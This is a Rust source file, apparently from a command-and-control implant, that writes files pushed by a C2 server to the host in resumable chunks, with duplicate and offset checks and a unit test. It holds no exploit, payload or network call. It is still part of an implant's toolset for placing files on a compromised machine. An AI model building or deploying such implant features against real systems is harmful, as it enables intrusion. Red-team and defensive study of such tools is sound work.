use std::fs::OpenOptions;
use std::io::{Seek, SeekFrom, Write};

use nw_profile::msgs::{FileAck, FileChunk};
use uuid::Uuid;

/// One active upload (a file the C2 server is pushing to this implant). Owns
/// an append-mode writer and the next byte offset, so `nw/upload <dest>`
/// streams data across consecutive server pushes.
pub struct Upload {
    file: std::fs::File,
    pub dest: String,
    size: u64,
    total_known: bool,
    /// Highest contiguous byte written so far (acked to the server).
    received: u64,
    transfer_id: Uuid,
    task_id: Uuid,
}

impl Upload {
    /// Create/append `dest` for a pushed file. Seeds `received` from the
    /// existing file's length so the server resumes from where it left off.
    pub fn open(dest: &str, transfer_id: Uuid, task_id: Uuid) -> Result<Self, String> {
        if dest.trim().is_empty() {
            return Err("empty destination path".into());
        }
        let file = OpenOptions::new()
            .create(true)
            .read(true)
            .write(true)
            .open(dest)
            .map_err(|e| format!("open {dest:?}: {e}"))?;
        let received = file
            .metadata()
            .map_err(|e| format!("stat {dest:?}: {e}"))?
            .len();
        Ok(Upload {
            file,
            dest: dest.to_string(),
            size: received,
            total_known: false,
            received,
            transfer_id,
            task_id,
        })
    }

    pub fn task_id(&self) -> Uuid {
        self.task_id
    }

    /// Current progress to report to the server next poll. Never reports
    /// `done` until a real total is known (a fresh, empty dest reports size 0).
    pub fn ack(&self) -> FileAck {
        FileAck {
            transfer_id: Some(self.transfer_id),
            received: self.received,
            total: if self.total_known { self.size } else { 0 },
            done: self.total_known && self.received >= self.size,
        }
    }

    /// Write one push chunk at its absolute offset, keeping `received` set to
    /// the highest contiguous offset. Returns a FileAck for the server.
    pub fn write_chunk(&mut self, chunk: &FileChunk) -> Result<FileAck, String> {
        if chunk.transfer_id != Some(self.transfer_id) {
            return Err("upload transfer id mismatch".into());
        }
        if chunk.task_id != Some(self.task_id) {
            return Err("upload task id mismatch".into());
        }
        if self.total_known && self.size != chunk.total {
            return Err("upload total mismatch".into());
        }
        self.size = chunk.total;
        self.total_known = true;
        if chunk.offset > self.received {
            return Err("upload chunk offset gap".into());
        }
        let end = chunk.offset.saturating_add(chunk.data.len() as u64);
        if end > self.size {
            return Err("upload chunk exceeds total".into());
        }
        if chunk.offset < self.received {
            if end > self.received {
                return Err("upload duplicate overlaps unreceived bytes".into());
            }
            self.file
                .seek(SeekFrom::Start(chunk.offset))
                .map_err(|_| "seek upload destination")?;
            let mut persisted = vec![0; chunk.data.len()];
            use std::io::Read;
            self.file
                .read_exact(&mut persisted)
                .map_err(|_| "read upload duplicate")?;
            if persisted != chunk.data {
                return Err("upload duplicate bytes mismatch".into());
            }
            return Ok(self.ack());
        }
        self.file
            .seek(SeekFrom::Start(chunk.offset))
            .map_err(|_| "seek upload destination")?;
        self.file
            .write_all(&chunk.data)
            .map_err(|_| "write upload destination")?;
        self.file
            .sync_all()
            .map_err(|_| "sync upload destination")?;
        if end > self.received {
            self.received = end;
        }
        Ok(FileAck {
            transfer_id: Some(self.transfer_id),
            received: self.received,
            total: self.size,
            done: self.received >= self.size,
        })
    }

    pub fn done(&self) -> bool {
        self.received >= self.size
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn writes_and_acks_contiguous() {
        let dir = std::env::temp_dir();
        let dest = dir.join(format!("nw-up-test-{}.bin", std::process::id()));
        let _ = std::fs::remove_file(&dest);

        let transfer_id = Uuid::new_v4();
        let task_id = Uuid::new_v4();
        let mut up = Upload::open(dest.to_str().unwrap(), transfer_id, task_id).unwrap();
        let data: Vec<u8> = (0..100u32).map(|i| (i % 251) as u8).collect();
        let ack = up
            .write_chunk(&FileChunk {
                transfer_id: Some(transfer_id),
                task_id: Some(task_id),
                name: dest.to_str().unwrap().to_string(),
                offset: 0,
                total: 100,
                data: data.clone(),
            })
            .unwrap();
        assert_eq!(ack.received, 100);
        assert!(ack.done);

        // A chunk starting before the acked offset must not shrink it.
        let duplicate_mismatch = up
            .write_chunk(&FileChunk {
                transfer_id: Some(transfer_id),
                task_id: Some(task_id),
                name: String::new(),
                offset: 40,
                total: 100,
                data: vec![9u8; 20],
            })
            .unwrap_err();
        assert_eq!(duplicate_mismatch, "upload duplicate bytes mismatch");

        let gap = up
            .write_chunk(&FileChunk {
                transfer_id: Some(transfer_id),
                task_id: Some(task_id),
                name: String::new(),
                offset: 101,
                total: 100,
                data: vec![1],
            })
            .unwrap_err();
        assert_eq!(gap, "upload chunk offset gap");

        let mismatch = up
            .write_chunk(&FileChunk {
                transfer_id: Some(Uuid::new_v4()),
                task_id: Some(task_id),
                name: String::new(),
                offset: 100,
                total: 101,
                data: vec![1],
            })
            .unwrap_err();
        assert_eq!(mismatch, "upload transfer id mismatch");

        std::fs::remove_file(&dest).ok();
    }
}
